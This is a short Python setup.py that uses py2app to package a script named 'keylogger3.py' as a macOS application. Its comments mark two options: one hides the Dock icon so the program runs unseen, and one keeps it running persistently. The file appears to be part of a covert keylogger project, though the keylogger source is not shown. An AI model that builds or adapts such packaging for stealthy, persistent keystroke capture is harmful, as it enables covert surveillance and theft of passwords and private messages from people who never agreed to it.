from setuptools import setup

APP = ['keylogger3.py']
OPTIONS = {
    'plist': {
        'LSUIElement': True,  # Hides Dock icon
        'KeepAlive': True,    # Runs persistently
    }
}

setup(
    app=APP,
    options={'py2app': OPTIONS},
    setup_requires=['py2app'],
)